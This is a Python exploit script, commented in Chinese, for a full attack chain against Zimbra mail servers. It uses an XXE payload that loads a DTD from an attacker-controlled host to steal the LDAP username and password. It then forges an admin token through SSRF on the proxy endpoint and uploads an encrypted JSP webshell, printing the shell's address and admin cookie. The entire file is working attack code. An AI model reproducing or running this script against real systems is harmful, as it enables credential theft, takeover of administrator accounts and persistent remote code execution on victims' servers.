# coding=utf8
import requests
import sys
import re
import time
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# 禁用SSL警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 配置重试策略和会话
def create_session():
    session = requests.Session()
    session.verify = False

    # 配置重试策略 - 移除503，减少重试
    retry_strategy = Retry(
        total=0,  # 改为0，不自动重试
        backoff_factor=0,
        status_forcelist=[500, 502, 504],  # 移除503
        allowed_methods=["GET", "POST"]
    )

    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=10,
        pool_maxsize=10
    )

    session.mount('http://', adapter)
    session.mount('https://', adapter)

    # 设置默认超时
    session.timeout = (10, 30)  # (连接超时, 读取超时)

    return session


def check_target_available(base_url, session):
    """检查目标是否可达"""
    try:
        print(f"[*] 检查目标 {base_url} 是否可达...")
        r = session.get(base_url, timeout=5)
        print(f"[+] 目标响应状态码: {r.status_code}")
        return True
    except requests.exceptions.Timeout:
        print("[-] 连接超时，目标不可达")
        return False
    except requests.exceptions.ConnectionError as e:
        print(f"[-] 连接错误: {e}")
        return False
    except Exception as e:
        print(f"[-] 未知错误: {e}")
        return False


if len(sys.argv) != 2:
    print("用法: python zimbra.py <目标URL>")
    print("示例: python zimbra.py https://10.0.0.12")
    sys.exit(1)

base_url = sys.argv[1].rstrip("/")
print(f"[*] 目标URL: {base_url}")

# 创建会话
session = create_session()

# 检查目标是否可用
if not check_target_available(base_url, session):
    print("[-] 目标不可达，请检查网络或增加超时时间")
    sys.exit(1)

# 上传文件名和内容
filename = "c.jsp"
fileContent = r'''<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>'''

# DT文件URL - 需要修改为你的攻击机IP
dtd_url = "http://172.16.233.2:8080/1.dtd"  # 修改这个IP
print(f"[*] 使用DTD文件: {dtd_url}")

# 检查DTD服务器是否可达
try:
    print("[*] 检查DTD服务器是否可达...")
    dtd_check = requests.get(dtd_url.replace("/1.dtd", ""), timeout=3)
    print(f"[+] DTD服务器可达")
except:
    print("[!] 警告: DTD服务器可能不可达，请确保攻击机已启动HTTP服务")

# XXE Payload
xxe_data = f"""<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM "{dtd_url}">
        %dtd;
        %all;
        ]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
</Autodiscover>"""

# XXE漏洞探测 - 使用原生的requests避免重试策略
print("[*] 测试XXE漏洞...")
headers = {"Content-Type": "application/xml"}

try:
    # 不使用session，直接用requests避免重试策略
    r = requests.post(
        base_url + "/Autodiscover/Autodiscover.xml",
        data=xxe_data.encode('utf-8'),
        headers=headers,
        verify=False,
        timeout=30
    )

    print(f"[*] 响应状态码: {r.status_code}")

    # 即使返回503，也检查响应内容
    if r.status_code == 503:
        print("[!] 服务器返回503错误，可能被WAF拦截或服务繁忙")
        print("[*] 响应内容:", r.text[:300])
        # 继续执行，不立即退出
    elif 'response schema not available' not in r.text:
        print("[-] 未检测到XXE漏洞")
        print("[*] 响应内容:", r.text[:500])
        sys.exit(1)
    else:
        print("[+] XXE漏洞存在")

except requests.exceptions.Timeout:
    print("[-] XXE请求超时，增加超时时间或检查网络")
    sys.exit(1)
except requests.exceptions.ConnectionError as e:
    print(f"[-] 连接错误: {e}")
    sys.exit(1)
except Exception as e:
    print(f"[-] XXE请求失败: {e}")
    print("[*] 尝试继续执行...")

# 提取用户名和密码
print("[*] 提取用户名和密码...")
pattern_name = re.compile(r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;",
                          re.DOTALL)
pattern_password = re.compile(
    r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;", re.DOTALL)

try:
    # 确保r变量存在
    if 'r' not in locals():
        print("[-] 没有收到响应，无法提取信息")
        sys.exit(1)

    username_match = pattern_name.findall(r.text)
    password_match = pattern_password.findall(r.text)

    if username_match and password_match:
        username = username_match[0][2]
        password = password_match[0][2]
        print(f"[+] 用户名: {username}")
        print(f"[+] 密码: {password}")
    else:
        print("[-] 未能提取到用户名和密码")
        print("[*] 响应内容片段:")
        print(r.text[:500])
        sys.exit(1)
except Exception as e:
    print(f"[-] 提取失败: {e}")
    if 'r' in locals():
        print(r.text[:1000])
    sys.exit(1)

# 认证请求体模板
auth_body_template = """<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="{xmlns}">
        <account by="adminName">{username}</account>
        <password>{password}</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>
"""

# 获取低权限Token
print("[*] 获取低权限认证Token...")
try:
    r = session.post(
        base_url + "/service/soap",
        data=auth_body_template.format(xmlns="urn:zimbraAccount", username=username, password=password),
        timeout=30
    )

    pattern_auth_token = re.compile(r"<authToken>(.*?)</authToken>")
    token_match = pattern_auth_token.search(r.text)

    if token_match:
        low_priv_token = token_match.group(1)
        print(f"[+] 低权限Token获取成功: {low_priv_token[:50]}...")
    else:
        print("[-] 获取低权限Token失败")
        print(r.text[:500])
        sys.exit(1)

except Exception as e:
    print(f"[-] 获取Token失败: {e}")
    sys.exit(1)

# SSRF + 获取管理员Token
print("[*] SSRF攻击获取管理员Token...")
headers["Cookie"] = f"ZM_ADMIN_AUTH_TOKEN={low_priv_token};"
headers["Host"] = "foo:7071"

try:
    r = session.post(
        base_url + "/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",
        data=auth_body_template.format(xmlns="urn:zimbraAdmin", username=username, password=password),
        headers=headers,
        timeout=30
    )

    admin_token_match = pattern_auth_token.search(r.text)

    if admin_token_match:
        admin_token = admin_token_match.group(1)
        print(f"[+] 管理员Token获取成功: {admin_token[:50]}...")
    else:
        print("[-] 获取管理员Token失败")
        print(r.text[:500])
        sys.exit(1)

except Exception as e:
    print(f"[-] SSRF攻击失败: {e}")
    sys.exit(1)

# 上传文件
print("[*] 上传恶意文件...")
files = {
    'filename1': (None, "whocare", None),
    'clientFile': (filename, fileContent, "text/plain"),
    'requestId': (None, "12", None),
}

headers_upload = {"Cookie": f"ZM_ADMIN_AUTH_TOKEN={admin_token};"}

try:
    r = session.post(
        base_url + "/service/extension/clientUploader/upload",
        files=files,
        headers=headers_upload,
        timeout=30
    )

    print(f"[*] 上传响应: {r.text}")
    download_url = base_url + "/downloads/" + filename
    print(f"[+] 文件上传成功，访问地址: {download_url}")

    # 等待文件写入
    print("[*] 等待3秒后访问上传的文件...")
    time.sleep(3)

    # 访问上传的文件
    print("[*] 访问上传的文件验证结果:")
    r2 = session.get(download_url, headers=headers_upload, timeout=30)

    if r2.status_code == 200:
        print(f"[+] 文件访问成功!")
        print(f"[+] 响应内容: {r2.text}")
        print(f"\n[+] Webshell地址: {download_url}")
        print(f"[+] Cookie: {headers_upload['Cookie']}")
    else:
        print(f"[-] 文件访问失败，状态码: {r2.status_code}")

except Exception as e:
    print(f"[-] 文件上传失败: {e}")

print("\n[*] 攻击完成!")